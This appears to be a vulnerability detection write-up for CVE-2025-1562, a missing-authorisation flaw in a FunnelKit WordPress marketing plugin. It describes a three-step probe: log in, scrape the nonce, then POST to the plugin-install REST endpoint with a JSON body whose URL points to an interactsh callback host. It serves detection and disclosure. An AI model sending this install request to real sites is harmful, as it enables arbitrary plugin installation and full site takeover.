## Vulnerability
CVE-2025-1562 is a Broken Access Control (CWE-862) vulnerability in the Recover WooCommerce Cart Abandonment, Newsletter, Email Marketing, Marketing Automation By FunnelKit (wp-marketing-automations) WordPress plugin. It stems from a missing capability check on `install_or_activate_addon_plugins()` combined with a weak nonce hash. CVSS 3.1 score is 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). All versions up to and including 3.5.3 are affected; fixed in 3.6.0. Unauthenticated attackers can install arbitrary plugins, enabling full site compromise via malicious code execution or backdoors.

## PoC / Detection
Classification: state-change

The template executes a three-step authenticated workflow: (1) POST to `/wp-login.php` with `{{username}}`/`{{password}}` to establish a session, (2) GET `/wp-admin/admin.php?page=autonami` to extract `bwfan_nonce` via regex from the response body, and (3) POST to `/wp-json/autonami-app/plugin/install_and_activate` with JSON `{"action":"install","url":"http://{{interactsh-url}}/{{randstr}}.zip"}`. Success is confirmed when the third response body contains the string `incompatible_archive`, an HTTP interactsh callback is observed (proving the server attempted to fetch the fake ZIP), `content_type_3` is `application/json`, and `status_code_3 == 200`. No plugin is actually installed or modified; the invalid URL serves only as a non-destructive probe to verify the endpoint processes the install request.
